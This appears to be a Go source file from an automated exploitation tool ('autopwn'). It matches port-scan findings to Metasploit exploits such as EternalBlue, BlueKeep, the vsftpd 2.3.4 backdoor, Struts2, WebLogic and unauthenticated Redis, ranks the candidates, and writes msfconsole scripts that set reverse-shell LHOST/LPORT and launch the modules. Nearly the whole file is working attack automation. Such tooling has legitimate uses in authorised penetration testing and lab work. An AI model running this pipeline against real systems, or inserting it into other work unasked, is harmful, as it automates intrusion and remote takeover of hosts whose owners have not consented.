package autopwn

import (
	"fmt"
	"sort"
	"strconv"
	"strings"

	"github.com/Autumn-27/artex/msf"
)

// Rule is one deterministic "observation → decision-layer class" edge. Keeping
// this table small and explicit is what makes the loop reproducible: the same
// scan always yields the same candidate order.
type Rule struct {
	Name  string
	Class string
	Match func(PortFinding) bool
}

// Rules is the reconnaissance → exploitation mapping used by Match. Classes are
// the ones msf.NormalizeClass knows, so every hit resolves to real modules
// instead of a guessed module name.
var Rules = []Rule{
	{
		Name:  "vsftpd-2.3.4-backdoor",
		Class: "vsftpd 2.3.4",
		Match: func(f PortFinding) bool { return strings.Contains(strings.ToLower(f.Product), "vsftpd 2.3.4") },
	},
	{
		Name:  "smb-ms17-010",
		Class: "eternalblue (MS17-010)",
		Match: func(f PortFinding) bool { return f.Port == 445 },
	},
	{
		Name:  "rdp-bluekeep",
		Class: "bluekeep",
		Match: func(f PortFinding) bool { return f.Port == 3389 },
	},
	{
		Name:  "tomcat-manager",
		Class: "tomcat",
		Match: func(f PortFinding) bool {
			p := strings.ToLower(f.Product)
			return p == "tomcat" || strings.Contains(p, "tomcat")
		},
	},
	{
		Name:  "struts2-ognl",
		Class: "struts2",
		Match: func(f PortFinding) bool { return strings.Contains(strings.ToLower(f.Product), "struts") },
	},
	{
		Name:  "jenkins-script-console",
		Class: "jenkins",
		Match: func(f PortFinding) bool { return strings.Contains(strings.ToLower(f.Product), "jenkins") },
	},
	{
		Name:  "weblogic-deserialize",
		Class: "weblogic",
		Match: func(f PortFinding) bool { return strings.Contains(strings.ToLower(f.Product), "weblogic") },
	},
	{
		Name:  "spring-actuator",
		Class: "spring4shell (Spring Framework)",
		Match: func(f PortFinding) bool { return strings.Contains(strings.ToLower(f.Product), "spring") },
	},
	{
		Name:  "redis-unauth",
		Class: "redis unauthorized",
		Match: func(f PortFinding) bool {
			return f.Port == 6379 && strings.Contains(strings.ToUpper(f.Banner), "PONG")
		},
	},
}

// Candidate is one executable attempt, resolved through the decision layer.
type Candidate struct {
	Rule       string            `json:"rule"`
	Class      string            `json:"class"`
	Port       int               `json:"port"`
	ModuleType string            `json:"module_type"`
	Module     string            `json:"module"`
	Payload    string            `json:"payload,omitempty"`
	Options    map[string]string `json:"options"`
	Confidence int               `json:"confidence"`
	Rationale  string            `json:"rationale"`
}

// Match turns scan findings into a deduplicated, confidence-ordered candidate
// list. Rule order breaks ties, so the plan is stable across runs.
func Match(target string, findings []PortFinding, lhost string, lport int) []Candidate {
	type keyed struct {
		cand Candidate
		seq  int
	}
	seen := map[string]bool{}
	var out []keyed
	seq := 0
	for _, f := range findings {
		for _, r := range Rules {
			if !r.Match(f) {
				continue
			}
			plan, err := msf.Build(msf.Input{
				VulnClass: r.Class,
				Host:      target,
				Port:      f.Port,
				Service:   f.Service,
				LHOST:     lhost,
				LPORT:     lport,
			})
			if err != nil || len(plan.Candidates) == 0 {
				continue
			}
			for _, c := range plan.Candidates {
				k := fmt.Sprintf("%d|%s|%s", f.Port, c.ModuleType, c.Module)
				if seen[k] {
					continue
				}
				seen[k] = true
				// The decision layer defaults RPORT from the service (21 for
				// vsftpd, 80 for http…). A scan on a non-standard port must keep
				// the port we actually found, otherwise the module probes the
				// wrong one.
				opts := make(map[string]string, len(c.Options)+1)
				for kk, vv := range c.Options {
					opts[kk] = vv
				}
				if f.Port > 0 {
					opts["RPORT"] = strconv.Itoa(f.Port)
				}
				out = append(out, keyed{seq: seq, cand: Candidate{
					Rule: r.Name, Class: plan.Class, Port: f.Port,
					ModuleType: c.ModuleType, Module: c.Module, Payload: c.Payload,
					Options: opts, Confidence: c.Confidence, Rationale: c.Rationale,
				}})
				seq++
			}
		}
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].cand.Confidence != out[j].cand.Confidence {
			return out[i].cand.Confidence > out[j].cand.Confidence
		}
		return out[i].seq < out[j].seq
	})
	res := make([]Candidate, 0, len(out))
	for _, k := range out {
		res = append(res, k.cand)
	}
	return res
}

// ConsoleScript renders a candidate as the console commands that actually run
// it (module.execute cannot carry TARGETURI and friends).
//
// LHOST/LPORT are only emitted for reverse payloads: setting them on a
// non-reverse payload (cmd/unix/interact, for example) makes msfconsole print
// "Unknown datastore option" and wastes a line of every transcript.
func ConsoleScript(c Candidate, lhost string, lport int) string {
	payload := strings.ToLower(c.Payload)
	reverse := c.Payload == "" || strings.Contains(payload, "reverse")
	var b strings.Builder
	fmt.Fprintf(&b, "use %s\n", c.Module)
	keys := make([]string, 0, len(c.Options))
	for k := range c.Options {
		switch k {
		case "PAYLOAD", "LHOST", "LPORT":
			continue
		}
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&b, "set %s %s\n", k, c.Options[k])
	}
	if c.Payload != "" {
		fmt.Fprintf(&b, "set PAYLOAD %s\n", c.Payload)
	}
	if reverse {
		if lhost != "" {
			fmt.Fprintf(&b, "set LHOST %s\n", lhost)
		}
		if lport > 0 {
			fmt.Fprintf(&b, "set LPORT %d\n", lport)
		}
	}
	b.WriteString("run -j\n")
	return b.String()
}
